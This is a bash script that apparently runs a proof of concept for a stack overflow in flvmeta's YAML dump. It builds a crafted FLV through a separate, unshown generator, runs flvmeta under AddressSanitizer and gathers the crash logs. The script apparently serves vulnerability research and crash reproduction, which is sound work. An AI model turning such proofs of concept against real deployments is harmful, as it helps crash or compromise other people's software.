#!/usr/bin/env bash
# PoC runner for VULN-002: Stack overflow in amf_data_yaml_dump (flvmeta)

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FLV_FILE="${SCRIPT_DIR}/vuln_002.flv"
RESULT_FILE="${SCRIPT_DIR}/vuln_002_result.txt"
ASAN_LOG_PREFIX="${SCRIPT_DIR}/asan.log"
FLVMETA_BIN="/data/ylwang/non-textfuzz/target/flvmeta/build_test/src/flvmeta"

# Step 1: Generate FLV if not present
if [ ! -f "${FLV_FILE}" ]; then
    echo "[*] Generating vuln_002.flv ..."
    python3 "${SCRIPT_DIR}/vuln_002_gen.py"
else
    echo "[*] vuln_002.flv already exists, skipping generation."
fi

# Step 2: Run flvmeta in default mode (YAML dump) against the crafted FLV
echo "[*] Running flvmeta (default YAML dump mode) ..."
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_PREFIX}" \
    "${FLVMETA_BIN}" "${FLV_FILE}" > "${RESULT_FILE}" 2>&1 || true

# Step 3: Append ASAN log contents (if any) to result file
for log in "${SCRIPT_DIR}"/asan.log.*; do
    if [ -f "${log}" ]; then
        echo "" >> "${RESULT_FILE}"
        echo "=== ASAN LOG: ${log} ===" >> "${RESULT_FILE}"
        cat "${log}" >> "${RESULT_FILE}"
    fi
done

# Also check for plain asan.log
if [ -f "${ASAN_LOG_PREFIX}" ]; then
    echo "" >> "${RESULT_FILE}"
    echo "=== ASAN LOG ===" >> "${RESULT_FILE}"
    cat "${ASAN_LOG_PREFIX}" >> "${RESULT_FILE}"
fi

echo "[*] Result written to: ${RESULT_FILE}"
echo "[*] --- Result summary ---"
head -40 "${RESULT_FILE}" || true
